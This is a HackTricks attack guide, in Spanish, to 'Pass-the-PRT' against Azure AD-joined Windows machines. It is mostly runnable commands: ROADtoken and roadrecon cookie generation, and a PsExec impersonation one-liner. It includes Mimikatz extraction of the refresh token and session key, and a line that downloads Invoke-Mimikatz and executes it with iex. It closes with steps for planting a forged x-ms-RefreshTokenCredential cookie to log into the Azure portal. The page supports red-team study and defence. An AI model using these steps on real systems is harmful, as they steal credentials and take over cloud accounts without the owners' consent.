# Az - Pass the PRT

{{#include ../../../banners/hacktricks-training.md}}

## ¿Qué es un PRT?

{{#ref}}
az-primary-refresh-token-prt.md
{{#endref}}

### Verifica si tienes un PRT
```
Dsregcmd.exe /status
```
En la sección del Estado SSO, deberías ver el **`AzureAdPrt`** configurado en **SÍ**.

<figure><img src="../../../images/image (140).png" alt=""><figcaption></figcaption></figure>

En la misma salida también puedes ver si el **dispositivo está unido a Azure** (en el campo `AzureAdJoined`):

<figure><img src="../../../images/image (135).png" alt=""><figcaption></figcaption></figure>

## Cookie PRT

La cookie PRT se llama en realidad **`x-ms-RefreshTokenCredential`** y es un JSON Web Token (JWT). Un JWT contiene **3 partes**, el **encabezado**, **carga útil** y **firma**, divididas por un `.` y todas codificadas en base64 seguras para URL. Una cookie PRT típica contiene el siguiente encabezado y cuerpo:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
El **Primary Refresh Token (PRT)** actual está encapsulado dentro del **`refresh_token`**, que está encriptado por una clave bajo el control de Azure AD, lo que hace que su contenido sea opaco e indecriptable para nosotros. El campo **`is_primary`** significa la encapsulación del token de actualización principal dentro de este token. Para asegurar que la cookie permanezca vinculada a la sesión de inicio de sesión específica para la que fue destinada, se transmite el `request_nonce` desde la página `logon.microsoftonline.com`.

### Flujo de la cookie PRT usando TPM

El proceso **LSASS** enviará al TPM el **KDF context**, y el TPM usará la **session key** (recolectada cuando el dispositivo fue registrado en AzureAD y almacenada en el TPM) y el contexto anterior para **derivar** una **clave**, y esta **clave derivada** se usa para **firmar la cookie PRT (JWT).**

El **KDF context es** un nonce de AzureAD y el PRT creando un **JWT** mezclado con un **contexto** (bytes aleatorios).

Por lo tanto, incluso si el PRT no puede ser extraído porque está ubicado dentro del TPM, es posible abusar de LSASS para **solicitar claves derivadas de nuevos contextos y usar las claves generadas para firmar Cookies**.

<figure><img src="../../../images/image (31).png" alt=""><figcaption></figcaption></figure>

## Escenarios de abuso de PRT

Como **usuario regular** es posible **solicitar el uso de PRT** pidiendo a LSASS datos de SSO.\
Esto se puede hacer como **aplicaciones nativas** que solicitan tokens del **Web Account Manager** (intermediario de tokens). WAM pasa la solicitud a **LSASS**, que pide tokens usando una afirmación de PRT firmada. O se puede hacer con flujos **basados en navegador (web)** donde se usa una **cookie PRT** como **encabezado** para autenticar solicitudes a las páginas de inicio de sesión de Azure AS.

Como **SYSTEM** podrías **robar el PRT si no está protegido** por TPM o **interactuar con las claves PRT en LSASS** usando APIs criptográficas.

## Ejemplos de ataque Pass-the-PRT

### Ataque - ROADtoken

Para más información sobre esta forma [**consulta esta publicación**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). ROADtoken ejecutará **`BrowserCore.exe`** desde el directorio correcto y lo usará para **obtener una cookie PRT**. Esta cookie puede ser utilizada con ROADtools para autenticar y **obtener un token de actualización persistente**.

Para generar una cookie PRT válida, lo primero que necesitas es un nonce.\
Puedes obtener esto con:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
O usando [**roadrecon**](https://github.com/dirkjanm/ROADtools):
```powershell
roadrecon auth prt-init
```
Entonces puedes usar [**roadtoken**](https://github.com/dirkjanm/ROADtoken) para obtener un nuevo PRT (ejecuta la herramienta desde un proceso del usuario a atacar):
```powershell
.\ROADtoken.exe <nonce>
```
Como una sola línea:
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
Luego puedes usar la **cookie generada** para **generar tokens** para **iniciar sesión** usando Azure AD **Graph** o Microsoft Graph:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Ataque - Usando roadrecon

### Ataque - Usando AADInternals y un PRT filtrado

`Get-AADIntUserPRTToken` **obtiene el token PRT del usuario** de la computadora unida a Azure AD o unida de forma híbrida. Utiliza `BrowserCore.exe` para obtener el token PRT.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
O si tienes los valores de Mimikatz, también puedes usar AADInternals para generar un token:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
Ve a [https://login.microsoftonline.com](https://login.microsoftonline.com), borra todas las cookies para login.microsoftonline.com e ingresa una nueva cookie.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
Luego ve a [https://portal.azure.com](https://portal.azure.com)

> [!CAUTION]
> El resto debería ser los valores predeterminados. Asegúrate de que puedes actualizar la página y que la cookie no desaparezca, si lo hace, es posible que hayas cometido un error y debas pasar por el proceso nuevamente. Si no lo hace, deberías estar bien.

### Ataque - Mimikatz

#### Pasos

1. El **PRT (Token de Actualización Primario) se extrae de LSASS** (Servicio de Subsistema de Autoridad de Seguridad Local) y se almacena para su uso posterior.
2. La **Clave de Sesión se extrae a continuación**. Dado que esta clave se emite inicialmente y luego se vuelve a cifrar por el dispositivo local, requiere descifrado utilizando una clave maestra de DPAPI. Información detallada sobre DPAPI (Interfaz de Programación de Aplicaciones de Protección de Datos) se puede encontrar en estos recursos: [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) y para entender su aplicación, consulta [Ataque Pass-the-cookie](az-pass-the-cookie.md).
3. Después del descifrado de la Clave de Sesión, se obtienen la **clave derivada y el contexto para el PRT**. Estos son cruciales para la **creación de la cookie PRT**. Específicamente, la clave derivada se utiliza para firmar el JWT (Token Web JSON) que constituye la cookie. Una explicación completa de este proceso ha sido proporcionada por Dirk-jan, accesible [aquí](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/).

> [!CAUTION]
> Ten en cuenta que si el PRT está dentro del TPM y no dentro de `lsass`, **mimikatz no podrá extraerlo**.\
> Sin embargo, será posible **obtener una clave de una clave derivada de un contexto** del TPM y usarla para **firmar una cookie (ver opción 3).**

Puedes encontrar una **explicación en profundidad del proceso realizado** para extraer estos detalles aquí: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

> [!WARNING]
> Esto no funcionará exactamente después de las correcciones de agosto de 2021 para obtener los tokens PRT de otros usuarios, ya que solo el usuario puede obtener su PRT (un administrador local no puede acceder a los PRT de otros usuarios), pero puede acceder al suyo.

Puedes usar **mimikatz** para extraer el PRT:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(Images from https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../images/image (251).png" alt=""><figcaption></figcaption></figure>

**Copia** la parte etiquetada como **Prt** y guárdala.\
Extrae también la clave de sesión (el **`KeyValue`** del campo **`ProofOfPossesionKey`**) que puedes ver resaltada a continuación. Esto está cifrado y necesitaremos usar nuestras claves maestras de DPAPI para descifrarlo.

<figure><img src="../../../images/image (182).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Si no ves ningún dato de PRT, podría ser que **no tengas ningún PRT** porque tu dispositivo no está unido a Azure AD o podría ser que estás **ejecutando una versión antigua** de Windows 10.

Para **descifrar** la clave de sesión, necesitas **elevar** tus privilegios a **SYSTEM** para ejecutar bajo el contexto de la computadora y poder usar la **clave maestra de DPAPI para descifrarlo**. Puedes usar los siguientes comandos para hacerlo:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../images/image (183).png" alt=""><figcaption></figcaption></figure>

#### Opción 1 - Mimikatz completo

- Ahora quieres copiar tanto el valor de Contexto:

<figure><img src="../../../images/image (210).png" alt=""><figcaption></figcaption></figure>

- Como el valor de la clave derivada:

<figure><img src="../../../images/image (150).png" alt=""><figcaption></figcaption></figure>

- Finalmente, puedes usar toda esta información para **generar cookies PRT**:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../images/image (282).png" alt=""><figcaption></figcaption></figure>

- Ve a [https://login.microsoftonline.com](https://login.microsoftonline.com), borra todas las cookies para login.microsoftonline.com e ingresa una nueva cookie.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
- Luego ve a [https://portal.azure.com](https://portal.azure.com)

> [!CAUTION]
> El resto debería ser los valores predeterminados. Asegúrate de que puedes actualizar la página y que la cookie no desaparezca; si lo hace, es posible que hayas cometido un error y debas repetir el proceso. Si no lo hace, deberías estar bien.

#### Opción 2 - roadrecon usando PRT

- Renueva el PRT primero, lo que lo guardará en `roadtx.prt`:
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
- Ahora podemos **solicitar tokens** utilizando el navegador interactivo con `roadtx browserprtauth`. Si usamos el comando `roadtx describe`, vemos que el token de acceso incluye un reclamo de MFA porque el PRT que utilicé en este caso también tenía un reclamo de MFA.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

#### Opción 3 - roadrecon usando claves derivadas

Teniendo el contexto y la clave derivada volcada por mimikatz, es posible usar roadrecon para generar una nueva cookie firmada con:
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
## Referencias

- [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
- [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
- [https://www.youtube.com/watch?v=x609c-MUZ_g](https://www.youtube.com/watch?v=x609c-MUZ_g)

{{#include ../../../banners/hacktricks-training.md}}
